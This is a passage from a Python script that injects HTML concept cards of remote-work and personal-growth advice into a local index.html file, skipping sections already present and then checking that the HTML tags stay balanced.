    <div class="concept-card">
      <div class="concept-label">THE REMOTE TRAP</div>
      <div class="concept-title">Home Office ≠ Always Available</div>
      <div class="concept-desc">The biggest remote work failure mode: no clear boundary between work and life. The laptop is always there. Slack is always pinging. You end up working more hours with less focus. The fix isn't willpower — it's structure: hard start and stop times, a dedicated workspace if possible, and closing work apps completely after hours.</div>
    </div>
    <div class="concept-card">
      <div class="concept-label">PRODUCTIVITY SETUP</div>
      <div class="concept-title">Tools and Habits That Actually Work</div>
      <div class="concept-desc">• <strong>Camera on for meetings</strong> — builds connection; keeps you accountable<br>
      • <strong>Async communication</strong> — send a message that doesn't require instant response; not everything needs a meeting<br>
      • <strong>Documented decisions</strong> — remote work requires more writing; decisions made verbally get forgotten or disputed<br>
      • <strong>Time zone awareness</strong> — know your teammates' working hours; don't expect a response at 7pm their time<br>
      • <strong>Intentional social interaction</strong> — remote work is isolating; deliberately build in non-work contact</div>
    </div>
    <div class="concept-card">
      <div class="concept-label">VISIBLE WORK</div>
      <div class="concept-title">Make Your Contributions Visible</div>
      <div class="concept-desc">In an office, people see you working. Remote, you must communicate your work explicitly. Share what you've accomplished, what you're blocked on, and what you're planning. This isn't bragging — it's helping your manager advocate for you and keeping the team aligned. Daily standups, weekly summaries, and clear status updates protect your reputation and ensure your work is recognized.</div>
    </div>
    <div class="concept-card">
      <div class="concept-label">THE WISDOM LOOP</div>
      <div class="concept-title">Experience → Reflection → Wisdom</div>
      <div class="concept-desc">Experience alone doesn't create wisdom — anyone can do the same job for 20 years and learn very little. Wisdom comes from experience + deliberate reflection. Keep a journal. Review your week. Ask "What worked? What didn't? What would I do differently?" The people who grow fastest aren't those who do the most — they're those who learn the most from what they do.</div>
    </div>
  </div>
</div>
"""


def patch(filepath: str, sentinel: str, inject_content: str, inject_anchor: str):
    path = Path(filepath)
    content = path.read_text(encoding="utf-8")

    if sentinel in content:
        print(f"  [skip] {sentinel} already present in {path.name}")
        return False

    if inject_anchor not in content:
        print(f"  [ERROR] Anchor not found: {inject_anchor!r} in {path.name}")
        return False

    new_content = content.replace(inject_anchor, inject_content + "\n" + inject_anchor)
    path.write_text(new_content, encoding="utf-8")
    added = len(new_content) - len(content)
    print(f"  [ok] Injected {added:+,} chars before {inject_anchor!r} in {path.name}")
    return True


def main():
    target = "index.html"

    results = [
        patch(target, SCRIPT_SENTINEL, SCRIPT_CONTENT, SCRIPT_INJECT_ANCHOR),
        patch(target, LINUX_SENTINEL,  LINUX_CONTENT,  LINUX_INJECT_ANCHOR),
        patch(target, SEC_SENTINEL,    SEC_CONTENT,    SEC_INJECT_ANCHOR),
        patch(target, OPS_SENTINEL,    OPS_CONTENT,    OPS_INJECT_ANCHOR),
        patch(target, LIFE_SENTINEL,   LIFE_CONTENT,   LIFE_INJECT_ANCHOR),
    ]

    if any(results):
        from html.parser import HTMLParser

        class BalanceChecker(HTMLParser):
            VOID = {"area","base","br","col","embed","hr","img","input","link","meta","param","source","track","wbr"}
            def __init__(self):
                super().__init__()
                self.stack = []
                self.strays = []
            def handle_starttag(self, tag, attrs):
                if tag not in self.VOID:
                    self.stack.append(tag)
            def handle_endtag(self, tag):
                if tag in self.VOID:
                    return
                if self.stack and self.stack[-1] == tag:
                    self.stack.pop()
                else:
                    self.strays.append(tag)

        checker = BalanceChecker()
        checker.feed(Path(target).read_text(encoding="utf-8"))
        print(f"\n  Unclosed at EOF: {checker.stack[-5:] if checker.stack else 'NONE'}")
        print(f"  Stray end tags: {len(checker.strays)}")

        new_len = Path(target).stat().st_size
        print(f"\n  {target}: {new_len:,} bytes")


if __name__ == "__main__":
    main()
